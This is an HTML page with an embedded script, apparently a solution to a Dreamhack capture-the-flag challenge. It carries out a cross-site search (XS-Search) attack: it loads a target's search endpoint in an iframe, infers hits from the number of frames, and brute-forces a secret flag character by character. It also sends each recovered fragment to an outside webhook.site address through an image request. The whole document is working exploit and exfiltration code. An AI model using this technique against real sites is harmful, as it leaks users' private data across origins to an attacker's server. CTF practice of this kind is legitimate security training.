<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;

            iframe.onload = () => {
                // You are assuming some detectable difference here.
                // Adjust this logic based on observable behavior
                if (iframe.contentWindow.frames.length === 1) {
                    resolve();
                } else {
                    reject();
                }
            };

            // Optional timeout fallback (in case onload never fires)
            setTimeout(() => reject(), 3000);
        });
    }

    async function search(query) {
        try {
            await req(`http://host8.dreamhack.games:20739/search?query=${query}`);
            return true;
        } catch {
            return false;
        }
    }

    async function exploit() {
        const charset = "0123456789abcdef}";
        let FLAG = "DH{";

        while (!FLAG.includes("}")) {
            for (let ch of charset) {
                const test = FLAG + ch;
                const success = await search(test);

                if (success) {
                    FLAG += ch;
                    console.log("Found: " + FLAG);
                    // Optional exfiltration (e.g., webhook)
                    img.src = `https://webhook.site/8b365bfd-7f5a-4cfa-a2d5-f168b5af1c1d/${FLAG}`;
                    break;
                }
            }
        }

        console.log("Final flag: " + FLAG);
    }

    exploit();
</script>
